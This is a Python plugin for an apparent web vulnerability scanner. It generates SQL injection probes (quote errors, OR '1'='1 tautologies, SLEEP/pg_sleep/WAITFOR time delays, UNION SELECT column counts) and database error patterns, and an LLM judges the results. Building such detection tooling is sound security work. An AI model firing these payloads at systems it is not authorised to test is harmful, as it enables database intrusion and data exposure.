"""SQL Injection Detection Plugin.

Generates SQLi payloads for testing. Does NOT judge - LLM does that.
"""

from __future__ import annotations

from typing import Any

from trix.plugins.vulns import BaseVulnPlugin, PayloadContext, PayloadSpec


class SQLiPlugin(BaseVulnPlugin):
    """SQL Injection detection plugin.
    
    Generates error-based, boolean-based, and time-based SQLi payloads.
    LLM is responsible for analyzing responses and determining if SQLi exists.
    """
    
    name = "sqli_detector"
    vuln_type = "sqli"
    description = "SQL Injection detection via error-based, boolean-based, and time-based techniques"
    version = "1.0.0"
    author = "Trix Security"
    
    def generate_payloads(self, context: PayloadContext) -> list[PayloadSpec]:
        """Generate SQLi test payloads."""
        payloads = []
        
        # === Error-based payloads ===
        payloads.extend(self._generate_error_based(context))
        
        # === Boolean-based payloads ===
        payloads.extend(self._generate_boolean_based(context))
        
        # === Time-based payloads ===
        payloads.extend(self._generate_time_based(context))
        
        # === UNION-based payloads ===
        payloads.extend(self._generate_union_based(context))
        
        return self.filter_payloads(payloads, context)
    
    def get_judgment_context(self, payload: PayloadSpec) -> dict[str, Any]:
        """Provide SQLi-specific context for LLM judgment."""
        return {
            "vuln_type": "sqli",
            "category": payload.category,
            "focus_patterns": [
                # MySQL
                "SQL syntax", "mysql_fetch", "mysql_query", "MySQL server",
                # PostgreSQL
                "pg_query", "pg_fetch", "PostgreSQL", "unterminated quoted string",
                # MSSQL
                "Microsoft SQL", "ODBC SQL Server", "mssql_query",
                # Oracle
                "ORA-", "Oracle", "TNS:",
                # SQLite
                "sqlite3", "SQLITE_ERROR", "unrecognized token",
                # Generic
                "SQL error", "syntax error", "database error", "query failed",
            ],
            "success_patterns": payload.success_patterns,
            "failure_patterns": payload.failure_patterns,
            "expected_behavior": payload.expected_behavior,
            "check_timing": payload.expected_delay_ms > 0,
            "expected_delay_ms": payload.expected_delay_ms,
        }
    
    def _generate_error_based(self, context: PayloadContext) -> list[PayloadSpec]:
        """Generate error-based SQLi payloads."""
        return [
            PayloadSpec(
                payload="'",
                description="Single quote - basic syntax error test",
                expected_behavior="SQL syntax error in response",
                category="error-based",
                severity="high",
                success_patterns=["syntax error", "SQL", "quote", "unterminated"],
            ),
            PayloadSpec(
                payload='"',
                description="Double quote - MySQL syntax error",
                expected_behavior="SQL syntax error in response",
                category="error-based",
                severity="high",
                success_patterns=["syntax error", "SQL"],
            ),
            PayloadSpec(
                payload="\\",
                description="Backslash - escape sequence error",
                expected_behavior="SQL syntax error or different behavior",
                category="error-based",
                severity="medium",
            ),
            PayloadSpec(
                payload="'--",
                description="Quote with comment - bypasses query remainder",
                expected_behavior="Changed behavior or error",
                category="error-based",
                severity="high",
            ),
            PayloadSpec(
                payload="1' AND '1'='2",
                description="False condition - should return no/different results",
                expected_behavior="Different response than baseline",
                category="error-based",
                severity="high",
            ),
        ]
    
    def _generate_boolean_based(self, context: PayloadContext) -> list[PayloadSpec]:
        """Generate boolean-based SQLi payloads."""
        orig = context.original_value or "1"
        return [
            PayloadSpec(
                payload=f"{orig}' AND '1'='1",
                description="Boolean true - should return same as baseline",
                expected_behavior="Same response as baseline",
                category="boolean-based",
                severity="high",
                success_patterns=[],  # Success = same as baseline
            ),
            PayloadSpec(
                payload=f"{orig}' AND '1'='2",
                description="Boolean false - should return different than baseline",
                expected_behavior="Different response than baseline",
                category="boolean-based",
                severity="high",
            ),
            PayloadSpec(
                payload=f"{orig}' OR '1'='1",
                description="Boolean tautology - should return all/more results",
                expected_behavior="More results or different behavior",
                category="boolean-based",
                severity="critical",
            ),
            PayloadSpec(
                payload=f"{orig}') OR ('1'='1",
                description="Parenthesis bypass tautology",
                expected_behavior="More results or different behavior",
                category="boolean-based",
                severity="critical",
            ),
        ]
    
    def _generate_time_based(self, context: PayloadContext) -> list[PayloadSpec]:
        """Generate time-based blind SQLi payloads."""
        return [
            # MySQL
            PayloadSpec(
                payload="1' AND SLEEP(5)--",
                description="MySQL SLEEP - 5 second delay",
                expected_behavior="Response delay of ~5 seconds",
                category="time-based",
                severity="high",
                expected_delay_ms=5000,
            ),
            PayloadSpec(
                payload="1' AND (SELECT SLEEP(5))--",
                description="MySQL subquery SLEEP",
                expected_behavior="Response delay of ~5 seconds",
                category="time-based",
                severity="high",
                expected_delay_ms=5000,
            ),
            # PostgreSQL
            PayloadSpec(
                payload="1'; SELECT pg_sleep(5);--",
                description="PostgreSQL pg_sleep",
                expected_behavior="Response delay of ~5 seconds",
                category="time-based",
                severity="high",
                expected_delay_ms=5000,
            ),
            # MSSQL
            PayloadSpec(
                payload="1'; WAITFOR DELAY '0:0:5';--",
                description="MSSQL WAITFOR DELAY",
                expected_behavior="Response delay of ~5 seconds",
                category="time-based",
                severity="high",
                expected_delay_ms=5000,
            ),
        ]
    
    def _generate_union_based(self, context: PayloadContext) -> list[PayloadSpec]:
        """Generate UNION-based SQLi payloads."""
        payloads = []
        
        # Test different column counts
        for cols in range(1, 6):
            nulls = ",".join(["NULL"] * cols)
            payloads.append(
                PayloadSpec(
                    payload=f"' UNION SELECT {nulls}--",
                    description=f"UNION with {cols} column(s)",
                    expected_behavior="Combined result set or column count info",
                    category="union-based",
                    severity="critical",
                )
            )
        
        return payloads


# Register the plugin
sqli_plugin = SQLiPlugin()
